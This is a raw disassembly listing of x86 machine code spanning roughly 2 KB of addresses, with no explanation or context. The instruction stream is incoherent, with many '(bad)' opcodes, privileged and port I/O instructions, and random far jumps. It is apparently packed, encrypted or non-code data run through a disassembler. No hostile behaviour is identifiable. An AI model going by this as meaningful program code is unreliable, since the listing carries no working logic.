  414ecf:	(bad)  
  414ed0:	mov    ah,0x2e
  414ed2:	in     eax,dx
  414ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed4:	and    BYTE PTR ds:0x67c6249f,bh
  414eda:	not    DWORD PTR [edi+0x5]
  414edd:	xchg   ecx,eax
  414ede:	pop    ds
  414edf:	scas   eax,DWORD PTR es:[edi]
  414ee0:	sti    
  414ee1:	repnz lock xchg edi,eax
  414ee4:	or     DWORD PTR [esi],eax
  414ee6:	mov    edx,0xa4cefc39
  414eeb:	mov    esp,0xe6c25987
  414ef0:	add    DWORD PTR [edi-0x13],esp
  414ef3:	xor    DWORD PTR [eax],esp
  414ef5:	and    al,0xb3
  414ef7:	lahf   
  414ef8:	push   ss
  414ef9:	sbb    BYTE PTR [eax+0x3a1d50d0],dl
  414eff:	mov    ecx,0x25de7a74
  414f04:	adc    eax,0x30e3d6a0
  414f09:	loop   0x414f1d
  414f0b:	jmp    0x414e95
  414f0d:	mov    WORD PTR [esi-0x685d3900],?
  414f13:	outs   dx,DWORD PTR ds:[esi]
  414f14:	rcr    BYTE PTR [ebx-0xabbf19],0xd9
  414f1b:	adc    dh,BYTE PTR [edi]
  414f1d:	push   cs
  414f1e:	mov    ch,0x32
  414f20:	imul   edi,DWORD PTR [eax+eax*2+0x37],0x49
  414f25:	clc    
  414f26:	and    BYTE PTR [ecx],ch
  414f28:	call   DWORD PTR [ecx+eax*2+0x2b]
  414f2c:	lock xlat BYTE PTR ds:[ebx]
  414f2e:	ret    
  414f2f:	loope  0x414efd
  414f31:	push   ds
  414f32:	and    BYTE PTR [eax+0x7d],0x18
  414f36:	mov    edx,0x226709fe
  414f3b:	test   eax,0xa8fcddb1
  414f40:	inc    edx
  414f41:	(bad)  
  414f42:	mov    DWORD PTR [edi-0x568e403f],edx
  414f48:	xchg   esi,eax
  414f49:	pop    ebp
  414f4a:	adc    eax,DWORD PTR [edx-0x381aa2cf]
  414f50:	mov    edx,DWORD PTR [esp+esi*1]
  414f53:	and    edi,DWORD PTR es:[ecx]
  414f56:	out    0xb4,al
  414f58:	mov    edx,0x70cf1eef
  414f5d:	xchg   DWORD PTR [esi-0x6531f89b],esp
  414f63:	cdq    
  414f64:	push   eax
  414f65:	les    edi,FWORD PTR [esi+0x2c]
  414f68:	mov    bh,0xa
  414f6a:	daa    
  414f6b:	mov    ebp,0x1d65a3de
  414f70:	xchg   BYTE PTR [ebx],bh
  414f72:	ret    0x2674
  414f75:	mov    ds:0x143b38b7,eax
  414f7a:	(bad)  
  414f7b:	xlat   BYTE PTR ds:[ebx]
  414f7c:	shl    DWORD PTR [ebx-0x68],cl
  414f7f:	aad    0x61
  414f81:	dec    ebp
  414f82:	repnz sub dh,BYTE PTR [ebp+0x27d1fc5b]
  414f89:	push   ds
  414f8a:	gs popf 
  414f8c:	or     DWORD PTR [ebp-0x167674a0],0x5f
  414f93:	out    dx,al
  414f94:	mov    bh,BYTE PTR [ebx]
  414f96:	div    BYTE PTR [eax-0x4f74f232]
  414f9c:	add    al,0x77
  414f9e:	rol    al,0xcc
  414fa1:	sub    ecx,esi
  414fa3:	sub    ebp,DWORD PTR [edi+0x0]
  414fa6:	(bad)  
  414fa7:	aam    0xe8
  414fa9:	add    al,dh
  414fab:	jmp    0x414fe0
  414fad:	push   0x39
  414faf:	cmp    dl,BYTE PTR [esi+0xe]
  414fb2:	mov    cl,dh
  414fb4:	inc    ebx
  414fb5:	shl    DWORD PTR [ebx+0x3873219b],0xbf
  414fbc:	add    BYTE PTR [esi-0x6d6b2c5],dl
  414fc2:	cmp    eax,0x8f724ed9
  414fc7:	mov    ah,0x63
  414fc9:	jo     0x414fb1
  414fcb:	push   0x3aed261d
  414fd0:	test   al,0x6f
  414fd2:	sub    eax,0xa0bb322c
  414fd7:	inc    ecx
  414fd8:	and    BYTE PTR [ebp-0xb87f88b],dh
  414fde:	xor    eax,0xbfe52599
  414fe3:	stos   BYTE PTR es:[edi],al
  414fe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fe5:	add    eax,0x283e4691
  414fea:	jbe    0x41505f
  414fec:	push   edi
  414fed:	push   esp
  414fee:	push   ss
  414fef:	ja     0x415012
  414ff1:	pop    es
  414ff2:	jae    0x414feb
  414ff4:	daa    
  414ff5:	pop    DWORD PTR [ebp+0x33ed755a]
  414ffb:	inc    ebx
  414ffc:	mov    ecx,0x377ea4a0
  415001:	lds    eax,FWORD PTR [ecx]
  415003:	cld    
  415004:	mov    dh,bl
  415006:	sub    ah,al
  415008:	leave  
  415009:	cli    
  41500a:	sbb    DWORD PTR [ecx-0x13ed3107],0xbd5e1b03
  415014:	xchg   BYTE PTR [ecx-0x1b],bl
  415017:	test   bh,cl
  415019:	fwait
  41501a:	sbb    eax,DWORD PTR [edx+edi*8-0x4b]
  41501e:	and    DWORD PTR [eax-0x5c],esp
  415021:	(bad)  
  415022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415023:	adc    eax,esp
  415025:	ret    
  415026:	aam    0x79
  415028:	push   ecx
  415029:	push   esp
  41502a:	xchg   esp,eax
  41502b:	mov    dh,0xa3
  41502d:	aad    0x8f
  41502f:	push   0x5f
  415031:	sub    edx,DWORD PTR [eax+ebp*1]
  415034:	and    BYTE PTR [ebp-0x17885da9],dl
  41503a:	cli    
  41503b:	dec    edi
  41503c:	test   eax,0x94b15d6f
  415041:	out    dx,al
  415042:	push   esi
  415043:	add    ch,bl
  415045:	loop   0x41508e
  415047:	cmp    al,0x7c
  415049:	shl    BYTE PTR [eax],0xbb
  41504c:	and    bl,BYTE PTR [esi+0x2b1baf26]
  415052:	xor    ebp,DWORD PTR [ebp+0x54]
  415055:	sbb    DWORD PTR [edi-0x746efa02],ecx
  41505b:	add    bl,BYTE PTR [ecx-0x1865f044]
  415061:	les    edx,FWORD PTR [edx-0x2fe672c4]
  415067:	push   0x769dd587
  41506c:	pop    edi
  41506d:	and    eax,0x153bb068
  415072:	add    esp,ebp
  415074:	cmp    DWORD PTR [eax+0x1f20da49],ebp
  41507a:	push   esp
  41507b:	fcom   QWORD PTR ds:0xc427e4e1
  415081:	push   es
  415082:	xchg   esp,eax
  415083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415084:	ds jb  0x415096
  415087:	js     0x415073
  415089:	or     al,0x4
  41508b:	adc    DWORD PTR [edi+eax*1+0x12],esi
  41508f:	imul   ebx,DWORD PTR [eax-0x66],0x8613c250
  415096:	pushf  
  415097:	pusha  
  415098:	jb     0x415027
  41509a:	jae    0x415114
  41509c:	mov    ebp,0x4c16645e
  4150a1:	mov    ebp,0x3c155aa9
  4150a6:	pop    es
  4150a7:	dec    eax
  4150a8:	arpl   WORD PTR [eax-0x6c],sp
  4150ab:	repz adc al,0xd0
  4150ae:	sbb    bl,ah
  4150b0:	int3   
  4150b1:	lds    ecx,FWORD PTR ds:0xe1a35793
  4150b7:	mov    es,WORD PTR [esi+0x51]
  4150ba:	sahf   
  4150bb:	mov    WORD PTR [ebx],es
  4150bd:	es inc esp
  4150bf:	xchg   edi,eax
  4150c0:	and    eax,0x43adcfe8
  4150c5:	lea    edi,[edi+0x13b4238f]
  4150cb:	into   
  4150cc:	and    esp,eax
  4150ce:	pop    edi
  4150cf:	dec    ebp
  4150d0:	xor    al,0x68
  4150d2:	pop    esp
  4150d3:	pop    ss
  4150d4:	mov    edi,0xaba200ef
  4150d9:	mov    ds:0x46eb8068,al
  4150de:	stos   BYTE PTR es:[edi],al
  4150df:	push   esp
  4150e0:	mov    ch,BYTE PTR [ecx+0x763bc082]
  4150e6:	xor    eax,0xdd214c91
  4150eb:	inc    ecx
  4150ec:	inc    ebx
  4150ed:	dec    esi
  4150ee:	mov    fs,WORD PTR [edx+esi*1-0x11]
  4150f2:	loope  0x415153
  4150f4:	cmp    DWORD PTR [eax+ebx*4+0x37],ebp
  4150f8:	inc    eax
  4150f9:	jge    0x415177
  4150fb:	repnz or al,0xdc
  4150fe:	jmp    0xf16b:0xcee4e45a
  415105:	add    edi,DWORD PTR [edx+0x54]
  415108:	add    edi,edi
  41510a:	lea    esp,[edx-0x38cd8d93]
  415110:	jb     0x415099
  415112:	daa    
  415113:	scas   eax,DWORD PTR es:[edi]
  415114:	sbb    dh,BYTE PTR [edi]
  415116:	push   ebp
  415117:	or     ch,bl
  415119:	xchg   ebx,eax
  41511a:	jmp    0x415182
  41511c:	loop   0x4150ef
  41511e:	pop    esp
  41511f:	imul   edx,ebp,0xdc2c2a5c
  415125:	mov    dh,0x73
  415127:	cmp    ecx,DWORD PTR [ecx+0x651ddd25]
  41512d:	pop    edi
  41512e:	sbb    DWORD PTR [ecx-0x30c9ef84],edx
  415134:	inc    ebp
  415135:	or     BYTE PTR [ebx-0x66d22e76],ah
  41513b:	mov    edi,0x533b54d9
  415140:	xor    eax,0xf2462142
  415145:	xor    eax,0xef333d6a
  41514a:	cmp    ebx,ebp
  41514c:	(bad)  
  41514d:	into   
  41514e:	adc    eax,0xcecb11fe
  415153:	hlt    
  415154:	xchg   BYTE PTR ds:0x2892ab33,al
  41515a:	dec    ebx
  41515b:	cmp    BYTE PTR [eax+0x676f11f2],bh
  415161:	(bad)  
  415162:	imul   eax,eax,0x1f
  415165:	or     cl,ch
  415167:	adc    BYTE PTR [ebx+ebx*4+0x70778f3e],bl
  41516e:	cdq    
  41516f:	and    ch,bl
  415171:	add    dh,BYTE PTR [edx+0x64]
  415174:	les    esi,FWORD PTR [edx-0x2a]
  415177:	push   edi
  415178:	add    al,0x9
  41517a:	or     al,0x2
  41517c:	mov    ebx,0xaf7bc5f1
  415181:	cli    
  415182:	scas   al,BYTE PTR es:[edi]
  415183:	test   al,0x25
  415185:	retf   0xf7e7
  415188:	inc    ebp
  415189:	adc    al,0x7
  41518b:	lods   al,BYTE PTR ds:[esi]
  41518c:	fisttp QWORD PTR [esi+0x499713de]
  415192:	ficom  WORD PTR [esi+eiz*4-0x3a]
  415196:	pop    ecx
  415197:	xor    eax,0x97a11cde
  41519c:	mov    BYTE PTR [ecx],dh
  41519e:	loopne 0x4151b1
  4151a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a1:	inc    eax
  4151a2:	and    DWORD PTR [ebp+0x7ae5ffd5],ebx
  4151a8:	dec    esp
  4151a9:	inc    ecx
  4151aa:	cmp    eax,0x67eb98b9
  4151af:	js     0x4151d5
  4151b1:	(bad)  
  4151b2:	lods   eax,DWORD PTR ds:[esi]
  4151b3:	jmp    0x21a442fa
  4151b8:	mov    ds:0x70d6350a,eax
  4151bd:	es push esp
  4151bf:	iret   
  4151c0:	ret    0xdd82
  4151c3:	add    BYTE PTR [esp+ebp*1-0x56ac8aae],cl
  4151ca:	push   es
  4151cb:	sbb    DWORD PTR [ebx+0x63],0x60
  4151cf:	inc    esp
  4151d0:	daa    
  4151d1:	add    al,0xff
  4151d3:	ret    0xc8a9
  4151d6:	je     0x4151c5
  4151d8:	jns    0x4151a7
  4151da:	sahf   
  4151db:	ror    DWORD PTR [ecx+0x3b],1
  4151de:	inc    ecx
  4151df:	xor    cl,BYTE PTR [edi-0x35121487]
  4151e5:	rcr    BYTE PTR [ecx-0x6c],1
  4151e8:	xchg   esp,eax
  4151e9:	jnp    0x41521e
  4151eb:	push   edi
  4151ec:	or     esi,DWORD PTR [esi-0x62c54e85]
  4151f2:	push   cs
  4151f3:	pop    esp
  4151f4:	xor    cl,BYTE PTR [esi-0xf]
  4151f7:	pop    ebp
  4151f8:	and    BYTE PTR [bx+si],bl
  4151fb:	(bad)  
  4151fc:	push   ebp
  4151fd:	xor    esi,ecx
  4151ff:	push   edi
  415200:	aas    
  415201:	dec    ebx
  415202:	cli    
  415203:	pop    esp
  415204:	rol    DWORD PTR [ecx-0x7b2b0a8f],1
  41520a:	call   0x81a8c9ca
  41520f:	shr    bh,cl
  415211:	jmp    0x4151db
  415213:	fdivr  st(3),st
  415215:	hlt    
  415216:	(bad)  
  415217:	(bad)  
  415218:	out    dx,al
  415219:	cmc    
  41521a:	aaa    
  41521b:	ins    BYTE PTR es:[edi],dx
  41521c:	(bad)  
  41521d:	sti    
  41521e:	fist   DWORD PTR [eax-0x382ea57a]
  415224:	inc    ebp
  415225:	mov    eax,ds:0xb6e2a8e8
  41522a:	push   cs
  41522b:	mov    ah,0x67
  41522d:	mov    dl,0x46
  41522f:	fimul  WORD PTR [ecx+0x9]
  415232:	ja     0x41521a
  415234:	scas   al,BYTE PTR es:[edi]
  415235:	jl     0x415230
  415237:	iret   
  415238:	aas    
  415239:	addr16 pop edi
  41523b:	in     al,dx
  41523c:	bound  edx,QWORD PTR [esi+esi*1-0x320b0c3]
  415243:	mov    esi,0xc4a6bc30
  415248:	xor    BYTE PTR [edi],dl
  41524a:	pusha  
  41524b:	or     ch,BYTE PTR [eax]
  41524d:	inc    ebp
  41524e:	inc    ebx
  41524f:	or     eax,0x9b282b67
  415254:	jmp    0x4b86:0xc3496bfc
  41525b:	aas    
  41525c:	loop   0x41525a
  41525e:	popa   
  41525f:	adc    ch,BYTE PTR [ebp+0xee0cf5d]
  415265:	mov    ah,0xae
  415267:	pusha  
  415268:	sbb    ebx,DWORD PTR [esi]
  41526a:	mov    BYTE PTR [eax+0x4ab0051b],al
  415270:	sbb    BYTE PTR [ebx-0x44],ch
  415273:	int    0xcf
  415275:	imul   esp,DWORD PTR fs:[ebx-0x10a766b1],0xa703427
  415280:	test   DWORD PTR [esi+0x7ce6c697],0xf891419c
  41528a:	dec    ecx
  41528b:	adc    dh,dl
  41528d:	call   0xfa3b:0x5845c2b0
  415294:	out    dx,eax
  415295:	addr16 mov ebx,0x6987bd3f
  41529b:	dec    edi
  41529c:	xchg   ebx,eax
  41529d:	sub    eax,DWORD PTR [edx-0x22fd003]
  4152a3:	xor    al,0x80
  4152a5:	and    ch,BYTE PTR [ebp-0x52]
  4152a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a9:	fld    QWORD PTR [ebx+0x6]
  4152ac:	fisubr DWORD PTR [eax+0x15]
  4152af:	aam    0xb4
  4152b1:	ds jge 0x415325
  4152b4:	ror    BYTE PTR [eax+0x511c53b7],1
  4152ba:	mov    bh,0x4c
  4152bc:	(bad)  
  4152bd:	outs   dx,DWORD PTR ds:[esi]
  4152be:	pop    edx
  4152bf:	xor    al,0x4a
  4152c1:	inc    edi
  4152c2:	mov    bl,0x9d
  4152c4:	inc    ebp
  4152c5:	xchg   esp,eax
  4152c6:	loope  0x4152d8
  4152c8:	rcl    edi,cl
  4152ca:	arpl   WORD PTR [esi+0x62],di
  4152cd:	out    0x7a,al
  4152cf:	cmp    ch,al
  4152d1:	rcl    DWORD PTR [ebx-0x72],cl
  4152d4:	mov    esi,0x6d63fdae
  4152d9:	ss push cs
  4152db:	pop    ss
  4152dc:	push   esi
  4152dd:	jo     0x4152ef
  4152df:	mov    ebp,0x33f01657
  4152e4:	ins    BYTE PTR es:[edi],dx
  4152e5:	jmp    FWORD PTR [eax+0x1f]
  4152e8:	or     al,0x6
  4152ea:	inc    ebp
  4152eb:	stos   DWORD PTR es:[edi],eax
  4152ec:	push   esi
  4152ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ee:	inc    ecx
  4152ef:	fsub   DWORD PTR [edi+0x44]
  4152f2:	adc    ch,BYTE PTR [ebx+0x3d]
  4152f5:	sub    BYTE PTR [esi+eiz*4+0x6cea46b1],dl
  4152fc:	icebp  
  4152fd:	outs   dx,BYTE PTR ds:[esi]
  4152fe:	pop    ebx
  4152ff:	ins    BYTE PTR es:[edi],dx
  415300:	mov    ebp,0x17c18c18
  415305:	mov    dl,0xdd
  415307:	pop    ds
  415308:	xchg   edi,eax
  415309:	cmp    BYTE PTR [eax+0x4aaf8300],bl
  41530f:	ja     0x4152fa
  415311:	aas    
  415312:	pop    esp
  415313:	push   edi
  415314:	dec    eax
  415315:	mov    ecx,0x6f69a9d9
  41531a:	push   esp
  41531b:	imul   eax,DWORD PTR [ebx-0x1c],0xffffffaf
  41531f:	ins    DWORD PTR es:[edi],dx
  415320:	push   ss
  415321:	shl    bl,0xd8
  415324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415325:	rol    BYTE PTR ds:0xaac4d621,1
  41532b:	arpl   bp,dx
  41532d:	ds xchg esp,eax
  41532f:	lds    esp,FWORD PTR [ebx-0xfc5b374]
  415335:	sbb    BYTE PTR [eax+0x45a4decd],0xb1
  41533c:	std    
  41533d:	mov    dl,0x4c
  41533f:	jae    0x4152d7
  415341:	ret    0x69e5
  415344:	xchg   ecx,eax
  415345:	push   0xae77a067
  41534a:	repnz mov cl,0x7c
  41534d:	pop    edx
  41534e:	mov    ebp,0x73ecbbfb
  415353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415354:	xor    bh,bh
  415356:	repz sbb BYTE PTR [eax-0x56],ch
  41535a:	and    al,0x3a
  41535c:	sub    eax,ecx
  41535e:	mov    ebx,0x4a129645
  415363:	jecxz  0x415305
  415365:	pop    edi
  415366:	mov    dh,0xd3
  415368:	xor    esi,DWORD PTR [edx+0x6f6a007b]
  41536e:	stos   BYTE PTR es:[edi],al
  41536f:	and    al,0x8a
  415371:	inc    ebx
  415372:	fldenv [ecx+0x60946382]
  415378:	call   0x16bb177
  41537d:	sti    
  41537e:	iret   
  41537f:	dec    esi
  415380:	mov    al,BYTE PTR [edx]
  415382:	cmc    
  415383:	call   0x19f5:0x8a06894c
  41538a:	and    BYTE PTR [edx],bl
  41538c:	and    eax,0x5c133ca
  415391:	repnz or bl,0x6
  415395:	jne    0x415368
  415397:	xor    DWORD PTR [edx],edi
  415399:	fst    QWORD PTR [ebx-0x76e2ab1f]
  41539f:	lods   eax,DWORD PTR ds:[esi]
  4153a0:	fst    st(6)
  4153a2:	and    DWORD PTR [esp+edx*8+0x5b],0x5fd7e463
  4153aa:	xor    ebp,DWORD PTR [esi]
  4153ac:	ja     0x4153bc
  4153ae:	ret    
  4153af:	fmul   QWORD PTR [ecx+eiz*8]
  4153b2:	mov    esi,0x6fc7eee
  4153b7:	mov    ds:0xa449639e,al
  4153bc:	sbb    dh,BYTE PTR ds:0xcff9799
  4153c2:	and    ah,BYTE PTR [ecx+0x65]
  4153c5:	das    
  4153c6:	js     0x4153c2
  4153c8:	mov    eax,ds:0x14e1d47e
  4153cd:	mov    eax,ds:0x66fdfca3
  4153d2:	out    0xd1,eax
  4153d4:	xor    DWORD PTR ss:[esi+0x3fd2f5a9],eax
  4153db:	retw   
  4153dd:	clc    
  4153de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153df:	out    0xb9,al
  4153e1:	xchg   esi,eax
  4153e2:	cli    
  4153e3:	lds    edi,FWORD PTR [ebp+0x70]
  4153e6:	(bad)  
  4153e8:	inc    eax
  4153e9:	sub    eax,0x3e31cd01
  4153ee:	sub    dh,BYTE PTR [esi-0x5c]
  4153f1:	inc    edi
  4153f2:	jge    0x4153ad
  4153f4:	and    esi,edx
  4153f6:	pop    edi
  4153f7:	xor    eax,0x3b72a508
  4153fc:	js     0x415446
  4153fe:	xor    dl,BYTE PTR [ebp+esi*8-0x8cfc851]
  415405:	(bad)  [ebx+0xba04053]
  41540b:	sbb    ebp,ebx
  41540d:	dec    esp
  41540e:	sub    cl,al
  415410:	or     bh,BYTE PTR ds:0x2098a0c8
  415416:	mov    al,ds:0xe5dd500c
  41541b:	shl    DWORD PTR [edi],1
  41541d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41541e:	inc    ecx
  41541f:	imul   ebp,DWORD PTR [esi],0x8b01b23b
  415425:	div    bh
  415427:	and    ah,ah
  415429:	ins    BYTE PTR es:[edi],dx
  41542a:	and    eax,DWORD PTR [ebx]
  41542c:	(bad)  
  41542e:	das    
  41542f:	xchg   esp,eax
  415430:	adc    DWORD PTR [esi-0x5958a9a],eax
  415436:	ins    DWORD PTR es:[edi],dx
  415437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415438:	lea    esp,[edi]
  41543a:	ja     0x4153d2
  41543c:	mov    al,ds:0xa9c2dd36
  415441:	cmp    DWORD PTR [eax],edx
  415443:	mov    edi,DWORD PTR [esi-0x52cee08d]
  415449:	mov    ds:0x8840ded,al
  41544e:	bound  edx,QWORD PTR [edi-0x76]
  415451:	dec    edi
  415452:	sbb    al,0xd0
  415454:	out    0x77,al
  415456:	dec    ebp
  415457:	not    BYTE PTR [esi-0x39]
  41545a:	inc    edx
  41545b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41545c:	into   
  41545d:	and    eax,DWORD PTR [ebx-0x23a73f69]
  415463:	ds xchg ebp,eax
  415465:	mov    dl,0x23
  415467:	mov    edi,0x15fbb045
  41546c:	adc    al,0xb8
  41546e:	lock adc DWORD PTR [edx],edi
  415471:	sbb    ebp,DWORD PTR [esi-0x2b]
  415474:	shl    BYTE PTR [esi-0x60115cd8],1
  41547a:	out    dx,eax
  41547b:	inc    ebp
  41547c:	mov    esp,0x93cc74f2
  415481:	imul   edx,DWORD PTR [esi-0x3d],0x5b
  415485:	lods   al,BYTE PTR ds:[esi]
  415486:	dec    ecx
  415487:	mov    ah,BYTE PTR [ebp+esi*4-0x79f5ca3e]
  41548e:	pop    edx
  41548f:	(bad)  
  415490:	sbb    ebx,DWORD PTR [ecx]
  415492:	or     bh,ah
  415494:	cli    
  415495:	or     al,dh
  415497:	mov    esp,0x5a8d12d6
  41549c:	cmp    ebp,DWORD PTR [eax+0x1f385335]
  4154a2:	adc    BYTE PTR [esi-0x4e],al
  4154a5:	mov    DWORD PTR ds:0xd6ddffb2,eax
  4154ab:	call   0xf9e6:0xa07cb9ff
  4154b2:	gs push ecx
  4154b4:	retf   
  4154b5:	xor    BYTE PTR [ecx+0x2d],ch
  4154b8:	cmp    dl,BYTE PTR [ebx]
  4154ba:	std    
  4154bb:	or     eax,0xf35aea4b
  4154c0:	push   esp
  4154c1:	loopne 0x415448
  4154c3:	xor    edi,ebp
  4154c5:	jo     0x415452
  4154c7:	jnp    0x41546d
  4154c9:	add    al,0xd3
  4154cb:	sar    cl,cl
  4154cd:	and    eax,0x3410c838
  4154d2:	adc    al,0x45
  4154d4:	mov    bl,BYTE PTR [edi]
  4154d6:	(bad)  
  4154d7:	addr16 retf 0x92f
  4154db:	jg     0x41548c
  4154dd:	mov    ds:0xc38c5701,eax
  4154e2:	addr16 ret 0xe5ce
  4154e6:	aas    
  4154e7:	add    cl,BYTE PTR [ecx-0x9ba08ee]
  4154ed:	lods   eax,DWORD PTR ds:[esi]
  4154ee:	imul   esi,ecx,0xfa29a7d9
  4154f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154f5:	ja     0x415492
  4154f7:	pop    eax
  4154f8:	jb     0x4154b9
  4154fa:	repnz inc ecx
  4154fc:	in     eax,dx
  4154fd:	xchg   ecx,eax
  4154fe:	loop   0x415494
  415500:	mov    al,ds:0xa2259d4f
  415505:	leave  
  415506:	call   0x6bb26a0c
  41550b:	dec    ebx
  41550c:	das    
  41550d:	push   ss
  41550e:	jge    0x415536
  415510:	pusha  
  415511:	cmp    esi,DWORD PTR [edi+0x7]
  415514:	dec    esp
  415515:	loop   0x415544
  415517:	in     eax,dx
  415518:	imul   ebx,DWORD PTR [edx],0x900048b7
  41551e:	sub    ax,0x62db
  415522:	faddp  st(6),st
  415524:	inc    edi
  415525:	cmp    esi,DWORD PTR [ecx]
  415527:	fnsave [esi+eiz*4-0x1f8b54a3]
  41552e:	jo     0x415565
  415530:	ins    DWORD PTR es:[edi],dx
  415531:	je     0x415555
  415533:	mov    bh,0x82
  415535:	imul   edx,edx,0x5
  415538:	inc    ebp
  415539:	retf   
  41553a:	stc    
  41553b:	popa   
  41553c:	test   esp,eax
  41553e:	cmc    
  41553f:	jle    0x41554d
  415541:	out    dx,eax
  415542:	sub    al,BYTE PTR [eax+0x1]
  415545:	or     bl,BYTE PTR [edx-0x578464c3]
  41554b:	dec    ebp
  41554c:	aaa    
  41554d:	stc    
  41554e:	push   es
  41554f:	mov    ebx,0xaae4933a
  415554:	sti    
  415555:	add    eax,edi
  415557:	int3   
  415558:	mov    dl,0xbf
  41555a:	and    al,0x68
  41555c:	das    
  41555d:	xlat   BYTE PTR ds:[ebx]
  41555e:	inc    edx
  41555f:	cmp    dh,BYTE PTR [edx+0x57]
  415562:	dec    ebp
  415563:	sbb    eax,ecx
  415565:	adc    ebx,DWORD PTR [edx+eax*8-0x46]
  415569:	arpl   WORD PTR [eax+0x45eff55f],sp
  41556f:	dec    edx
  415570:	jne    0x415571
  415572:	cmp    BYTE PTR [esp+ecx*1+0x50ab6d5a],bh
  415579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41557a:	sub    DWORD PTR [ebx-0x24],eax
  41557d:	pop    ecx
  41557e:	dec    esi
  41557f:	cmp    BYTE PTR [esi-0x5],ah
  415582:	mov    edx,0x17cf0258
  415587:	mov    ah,0x6e
  415589:	add    ebp,DWORD PTR [ecx-0x33]
  41558c:	jo     0x4155ba
  41558e:	pop    edx
  41558f:	mov    bl,0xc7
  415591:	dec    ebx
  415592:	push   cs
  415593:	ret    
  415594:	ror    DWORD PTR [eax],cl
  415596:	ss push eax
  415598:	pushf  
  415599:	data16 rdmsr 
  41559c:	sub    eax,DWORD PTR [edx]
  41559e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41559f:	sbb    dl,ch
  4155a1:	jmp    0x4155e1
  4155a3:	jp     0x4155a4
  4155a5:	ret    
  4155a6:	mov    ch,0x59
  4155a8:	cmc    
  4155a9:	push   ebp
  4155aa:	mov    ds:0x1b24bc56,al
  4155af:	ja     0x4155ef
  4155b1:	(bad)  
  4155b2:	mov    al,0xb7
  4155b4:	in     al,dx
  4155b5:	into   
  4155b6:	mov    al,0x35
  4155b8:	repnz sbb bh,al
  4155bb:	sbb    ah,ch
  4155bd:	xchg   DWORD PTR [eax],ebx
  4155bf:	imul   ecx,ebx,0x67c9dcc6
  4155c5:	fnstsw WORD PTR [eax-0x18]
  4155c8:	aam    0xfb
  4155ca:	xchg   ebp,eax
  4155cb:	stos   DWORD PTR es:[edi],eax
  4155cc:	sahf   
  4155cd:	rcl    BYTE PTR [ebx],cl
  4155cf:	and    BYTE PTR [ebp+ebx*8-0x6d],ah
  4155d3:	fs dec edx
  4155d5:	add    ebp,DWORD PTR [ebp-0x60f7d6e7]
  4155db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155dc:	ror    BYTE PTR [edx+0x21],0xa2
  4155e0:	pop    ecx
  4155e1:	dec    edi
  4155e2:	mov    dh,0xa1
  4155e4:	dec    edx
  4155e5:	add    al,0x33
  4155e7:	pop    ecx
  4155e8:	inc    ebp
  4155e9:	dec    eax
  4155ea:	push   ebp
  4155eb:	scas   eax,DWORD PTR es:[edi]
  4155ec:	inc    ebp
  4155ed:	addr16 out 0x5c,eax
  4155f0:	(bad)  
  4155f1:	inc    eax
  4155f2:	stc    
  4155f3:	je     0x41564c
  4155f5:	mov    al,ch
  4155f7:	add    bl,ch
  4155f9:	(bad)  
  4155fa:	pop    esp
  4155fb:	pop    ebp
  4155fc:	addr16 push eax
  4155fe:	(bad)  
  4155ff:	lds    esp,FWORD PTR [ebx+0x5175161b]
  415605:	mov    ds:0xab13898d,al
  41560a:	xchg   BYTE PTR [ecx],bl
  41560c:	jnp    0x4155b6
  41560e:	or     eax,ebp
  415610:	jb     0x41564e
  415612:	mov    ds:0xbadf3ec2,eax
  415617:	and    eax,0x722d42a9
  41561c:	mov    bh,0x2d
  41561e:	and    bh,BYTE PTR [ecx+0x487a346d]
  415624:	jmp    0x415651
  415626:	inc    ebp
  415627:	mov    edx,0x31d6d251
  41562c:	mov    ch,0x6b
  41562e:	or     ecx,esi
  415630:	ret    
  415631:	dec    ecx
  415632:	repnz or eax,0x80110562
  415638:	repnz xor al,0xf0
  41563b:	lock and eax,0x77606fc6
  415641:	addr16 leave 
  415643:	in     eax,0x31
  415645:	gs inc eax
  415647:	shl    DWORD PTR [eax],cl
  415649:	sahf   
  41564a:	shl    dl,0x9d
  41564d:	add    eax,0x77ee8013
  415652:	sbb    DWORD PTR [ecx],0x358464c9
  415658:	sub    al,0x94
  41565a:	outs   dx,DWORD PTR ds:[esi]
  41565b:	xchg   ebx,eax
  41565c:	pop    ss
  41565d:	jge    0x4156cd
  41565f:	push   ebp
  415660:	or     al,BYTE PTR ds:0x9962a2d3
  415666:	ret    0x8fb8
  415669:	and    BYTE PTR [esi-0x49],cl
  41566c:	ins    BYTE PTR es:[edi],dx
  41566d:	mov    edi,DWORD PTR [edx]
  41566f:	cmp    esp,DWORD PTR [ebx+0x635a9c6b]
  415675:	lea    ecx,[edx+0xf07eb87]
  41567b:	sbb    eax,DWORD PTR [ebp-0x3af373e9]
  415681:	rcr    ah,cl
  415683:	pushf  
  415684:	jo     0x415647
  415686:	ja     0x415706
  415688:	nop
  415689:	out    0x43,al
  41568b:	mov    al,ds:0x9f14a4b
  415690:	inc    edi
  415691:	out    0x77,al
  415693:	push   0x69b48b1
  415698:	cmp    ebp,DWORD PTR [esi+0x72]
  41569b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41569c:	xor    DWORD PTR [ecx-0x19504c5],ebx
  4156a2:	pushf  
  4156a3:	shl    ch,cl
  4156a5:	aad    0xba
  4156a7:	int    0xa5
  4156a9:	mov    esi,DWORD PTR [ebp+0x25]
  4156ac:	xchg   edi,eax
  4156ad:	cdq    
  4156ae:	push   eax
  4156af:	mov    al,ds:0xb8713bbd
  4156b4:	dec    esp
  4156b5:	clc    
